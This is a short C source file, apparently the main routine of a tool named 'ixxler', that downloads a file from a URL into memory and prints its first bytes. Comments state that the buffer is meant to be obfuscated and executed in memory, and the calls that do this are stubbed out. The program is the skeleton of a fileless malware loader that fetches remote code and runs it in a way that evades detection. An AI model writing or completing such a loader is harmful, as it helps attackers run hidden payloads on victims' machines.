#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"
#include "downloader.h"
#include "obfuscator.h"
#include "memory.h"
#include "logs.h"

void show_help() {
    printf("Usage: ixxler [OPTIONS]\n");
    printf("Options:\n");
    printf("  -f <file>       Path to the executable to process\n");
    printf("  -d <url>        Download file from a URL\n");
    printf("  -t <timeout>    Set the download timeout in seconds\n");
    printf("  -h              Show this help message\n");
}

int main(int argc, char *argv[]) {
    Config config;
    load_config(&config);

    // Step 2: Parse command-line arguments
    char *download_url = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            download_url = argv[i + 1];
            i++;
        } else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            config.timeout = atoi(argv[i + 1]);
            i++;
        } else if (strcmp(argv[i], "-h") == 0) {
            show_help();
            return 0;
        }
    }

    // Step 3: Handle downloading functionality
    if (download_url) {
        printf("[+] Downloading file from: %s\n", download_url);

        MemoryBuffer mem = {0}; // Initialize memory buffer

        if (download_file_to_memory(download_url, &mem) == 0) {
            printf("[+] File downloaded into memory (size: %zu bytes)\n", mem.size);

            // Print the first few bytes of the downloaded file for verification
            for (size_t i = 0; i < (mem.size < 10 ? mem.size : 10); i++) {
                printf("%02X ", mem.buffer[i]);
            }
            printf("\n");

            // Here, you would pass the buffer to obfuscate and execute
            // obfuscate_file_in_memory(mem.buffer, mem.size);
            // execute_in_memory(mem.buffer, mem.size);
        } else {
            fprintf(stderr, "[ERROR] Failed to download file.\n");
            return 1;
        }

        // Free the memory buffer
        free(mem.buffer);
    }

    printf("[+] Task completed successfully!\n");
    return 0;
}
